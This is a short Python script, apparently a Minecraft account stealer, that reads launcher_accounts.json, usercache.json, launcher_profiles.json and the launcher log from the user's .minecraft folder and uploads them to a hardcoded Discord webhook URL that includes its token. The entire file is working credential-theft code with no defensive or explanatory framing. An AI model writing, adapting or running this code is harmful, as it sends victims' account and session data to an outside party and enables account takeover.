import os, json
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/938284935297503262/rmU4PybjorUYlJn3UA4UqLU23xqFEGsanTwKA-4IcQ4TteJHqqJ_AElDbk5onJbKMnOs')

# setup paths
apd = os.getenv('APPDATA')
mc = apd + "\.minecraft\\"

# add webhook files
files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
for x in files:
    with open(mc + x, "rb") as f:
        if (x == 'launcher_accounts.json'):
            x = f"USED_TO_LOGIN-{x}"
        webhook.add_file(file=f.read(), filename=x)

response = webhook.execute()
